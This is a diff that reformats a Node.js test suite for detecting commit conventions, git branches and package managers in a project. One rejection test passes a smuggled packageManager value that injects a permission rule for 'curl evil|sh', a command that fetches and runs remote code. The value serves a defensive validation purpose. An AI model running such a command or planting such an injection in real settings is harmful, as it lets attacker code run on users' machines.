@@ -1,44 +1,70 @@
 import assert from 'node:assert/strict';
 import { execFileSync } from 'node:child_process';
-import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
+import {
+    mkdirSync, mkdtempSync, writeFileSync 
+} from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { test } from 'node:test';
 import './git-env.js';
 import { CONVENTIONS } from '../src/conventions.js';
-import { detectCommitConvention, detectDefaultBranch,detectPackageManager, isGitRepo, localBranches } from '../src/detect.js';
+import {
+    detectCommitConvention, detectDefaultBranch, detectPackageManager, isGitRepo, localBranches 
+} from '../src/detect.js';
 import { render } from '../src/install.js';
 
 const temp = () => mkdtempSync(join(tmpdir(), 'brigade-detect-'));
-const git = (cwd, ...args) => execFileSync('git', args, { cwd, stdio: 'ignore' });
+
+const git = (cwd, ...args) => execFileSync('git', args, {
+    cwd,
+    stdio: 'ignore' 
+});
 
 // The unborn branch is set by hand so the result never depends on `init.defaultBranch`.
 function repo(branch = 'trunk') {
     const cwd = temp();
+
     git(cwd, 'init');
     git(cwd, 'symbolic-ref', 'HEAD', `refs/heads/${branch}`);
+
     return cwd;
 }
 
 function project(deps, hook = true) {
     const cwd = mkdtempSync(join(tmpdir(), 'brigade-detect-'));
-    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ devDependencies: deps }));
+
+    writeFileSync(join(cwd, 'package.json'), JSON.stringify({
+        devDependencies: deps 
+    }));
+
     if (hook) {
         mkdirSync(join(cwd, '.husky'));
         writeFileSync(join(cwd, '.husky/commit-msg'), 'npx commitlint --edit "$1"\n');
     }
+
     return cwd;
 }
 
 test('commit convention needs commitlint and a commit-msg hook', () => {
-    assert.equal(detectCommitConvention(project({ '@commitlint/config-conventional': '1' })), 'conventional');
-    assert.equal(detectCommitConvention(project({ '@commitlint/config-angular': '1' })), 'angular');
-    assert.equal(detectCommitConvention(project({ '@commitlint/config-conventional': '1' }, false)), '');
+    assert.equal(detectCommitConvention(project({
+        '@commitlint/config-conventional': '1' 
+    })), 'conventional');
+
+    assert.equal(detectCommitConvention(project({
+        '@commitlint/config-angular': '1' 
+    })), 'angular');
+
+    assert.equal(detectCommitConvention(project({
+        '@commitlint/config-conventional': '1' 
+    }, false)), '');
+
     assert.equal(detectCommitConvention(project({})), '');
 });
 
 test('every convention shares the same length limit', () => {
-    for (const { format } of Object.values(CONVENTIONS)) assert.match(format, /72 characters max\.$/);
+    for (const { format } of Object.values(CONVENTIONS)) {
+        assert.match(format, /72 characters max\.$/);
+    }
 });
 
 test('isGitRepo tells a repository from a plain folder', () => {
@@ -48,15 +74,21 @@ test('isGitRepo tells a repository from a plain folder', () => {
 
 test('localBranches lists the branches and is empty outside a repository', () => {
     const cwd = repo('main');
+
     assert.deepEqual(localBranches(cwd), []);
     git(cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '--allow-empty', '-m', 'init');
     git(cwd, 'branch', 'develop');
-    assert.deepEqual(localBranches(cwd).sort(), ['develop', 'main']);
+    assert.deepEqual(localBranches(cwd).sort(), [
+        'develop',
+        'main'
+    ]);
+
     assert.deepEqual(localBranches(temp()), []);
 });
 
 test('the default branch is the remote HEAD, then init.defaultBranch, then the current branch', () => {
     const cwd = repo('current');
+
     assert.equal(detectDefaultBranch(cwd), 'current');
 
     git(cwd, 'config', 'init.defaultBranch', 'configured');
@@ -70,43 +102,97 @@ test('the default branch is the remote HEAD, then init.defaultBranch, then the c
 
 test('the package manager comes from packageManager, else from a single lockfile', () => {
     const declared = temp();
-    writeFileSync(join(declared, 'package.json'), JSON.stringify({ packageManager: 'pnpm@9.1.0' }));
+
+    writeFileSync(join(declared, 'package.json'), JSON.stringify({
+        packageManager: 'pnpm@9.1.0' 
+    }));
+
     writeFileSync(join(declared, 'yarn.lock'), '');
-    assert.deepEqual(detectPackageManager(declared), { value: 'pnpm', candidates: ['pnpm'] });
+    assert.deepEqual(detectPackageManager(declared), {
+        value: 'pnpm',
+        candidates: [
+            'pnpm'
+        ] 
+    });
 
     const single = temp();
+
     writeFileSync(join(single, 'yarn.lock'), '');
-    assert.deepEqual(detectPackageManager(single), { value: 'yarn', candidates: ['yarn'] });
+    assert.deepEqual(detectPackageManager(single), {
+        value: 'yarn',
+        candidates: [
+            'yarn'
+        ] 
+    });
 
     const bun = temp();
+
     writeFileSync(join(bun, 'bun.lock'), '');
     writeFileSync(join(bun, 'bun.lockb'), '');
-    assert.deepEqual(detectPackageManager(bun), { value: 'bun', candidates: ['bun'] });
+    assert.deepEqual(detectPackageManager(bun), {
+        value: 'bun',
+        candidates: [
+            'bun'
+        ] 
+    });
 });
 
 test('a packageManager that is not a known manager is rejected', () => {
-    for (const packageManager of ['x" ,"Bash(curl evil|sh:*)@1', 'deno@2.0.0', '', 42]) {
+    for (const packageManager of [
+        'x" ,"Bash(curl evil|sh:*)@1',
+        'deno@2.0.0',
+        '',
+        42
+    ]) {
         const cwd = temp();
-        writeFileSync(join(cwd, 'package.json'), JSON.stringify({ packageManager }));
-        assert.deepEqual(detectPackageManager(cwd), { value: '', candidates: [] });
+
+        writeFileSync(join(cwd, 'package.json'), JSON.stringify({
+            packageManager 
+        }));
+
+        assert.deepEqual(detectPackageManager(cwd), {
+            value: '',
+            candidates: [] 
+        });
     }
 
     const lockfile = temp();
-    writeFileSync(join(lockfile, 'package.json'), JSON.stringify({ packageManager: 'evil@1' }));
+
+    writeFileSync(join(lockfile, 'package.json'), JSON.stringify({
+        packageManager: 'evil@1' 
+    }));
+
     writeFileSync(join(lockfile, 'yarn.lock'), '');
-    assert.deepEqual(detectPackageManager(lockfile), { value: 'yarn', candidates: ['yarn'] });
+    assert.deepEqual(detectPackageManager(lockfile), {
+        value: 'yarn',
+        candidates: [
+            'yarn'
+        ] 
+    });
 });
 
 test('several lockfiles or none leave the package manager empty', () => {
     const several = temp();
+
     writeFileSync(join(several, 'package-lock.json'), '');
     writeFileSync(join(several, 'pnpm-lock.yaml'), '');
-    assert.deepEqual(detectPackageManager(several), { value: '', candidates: ['pnpm', 'npm'] });
-    assert.deepEqual(detectPackageManager(temp()), { value: '', candidates: [] });
+    assert.deepEqual(detectPackageManager(several), {
+        value: '',
+        candidates: [
+            'pnpm',
+            'npm'
+        ] 
+    });
+
+    assert.deepEqual(detectPackageManager(temp()), {
+        value: '',
+        candidates: [] 
+    });
 });
 
 test('a broken package.json is ignored', () => {
     const cwd = temp();
+
     writeFileSync(join(cwd, 'package.json'), '{ broken');
     writeFileSync(join(cwd, 'package-lock.json'), '');
     assert.equal(detectPackageManager(cwd).value, 'npm');
@@ -114,14 +200,30 @@ test('a broken package.json is ignored', () => {
 });
 
 test('commitlint without a known config detects no convention', () => {
-    assert.equal(detectCommitConvention(project({ '@commitlint/cli': '1' })), '');
+    assert.equal(detectCommitConvention(project({
+        '@commitlint/cli': '1' 
+    })), '');
 });
 
 test('the conventional format states the Conventional Commits 1.0.0 rules', () => {
     const { format } = CONVENTIONS.conventional;
-    for (const type of ['feat', 'fix', 'build', 'chore', 'ci', 'docs', 'perf', 'refactor', 'revert', 'style', 'test']) {
+
+    for (const type of [
+        'feat',
+        'fix',
+        'build',
+        'chore',
+        'ci',
+        'docs',
+        'perf',
+        'refactor',
+        'revert',
+        'style',
+        'test'
+    ]) {
         assert.ok(format.includes(`\`${type}\``), `${type} is missing`);
     }
+
     assert.match(format, /`!` before the colon/);
     assert.match(format, /BREAKING CHANGE: <description>/);
     assert.match(format, /body starts after one blank line/);
@@ -131,9 +233,20 @@ test('the conventional format states the Conventional Commits 1.0.0 rules', () =
 
 test('the angular format states the Angular commit message rules', () => {
     const { format } = CONVENTIONS.angular;
-    for (const type of ['build', 'ci', 'docs', 'feat', 'fix', 'perf', 'refactor', 'test']) {
+
+    for (const type of [
+        'build',
+        'ci',
+        'docs',
+        'feat',
+        'fix',
+        'perf',
+        'refactor',
+        'test'
+    ]) {
         assert.ok(format.includes(`\`${type}\``), `${type} is missing`);
     }
+
     assert.match(format, /not capitalized, with no period at the end/);
     assert.match(format, /body is required for every type except `docs`/);
     assert.match(format, /BREAKING CHANGE: <short summary>/);
@@ -146,6 +259,7 @@ test('the angular format states the Angular commit message rules', () => {
 
 test('the gitmoji format states the gitmoji specification', () => {
     const { format } = CONVENTIONS.gitmoji;
+
     assert.match(format, /unicode/);
     assert.match(format, /shortcode \(`:sparkles:`\)/);
     assert.match(format, /scope is optional/);
@@ -155,11 +269,21 @@ test('the gitmoji format states the gitmoji specification', () => {
 });
 
 test('the generic body sentence is left out only when the convention has its own body rule', () => {
-    const answers = (commitConvention) => ({ commitConvention, commitFormat: 'My format.' });
+    const answers = (commitConvention) => ({
+        commitConvention,
+        commitFormat: 'My format.' 
+    });
     const sentence = 'Add a body when the "why" is not obvious.';
     const template = '__COMMIT_FORMAT__';
-    for (const name of ['conventional', 'gitmoji', 'imperative', 'custom']) {
+
+    for (const name of [
+        'conventional',
+        'gitmoji',
+        'imperative',
+        'custom'
+    ]) {
         assert.ok(render(template, answers(name)).endsWith(sentence), name);
     }
+
     assert.equal(render(template, answers('angular')), CONVENTIONS.angular.format);
 });
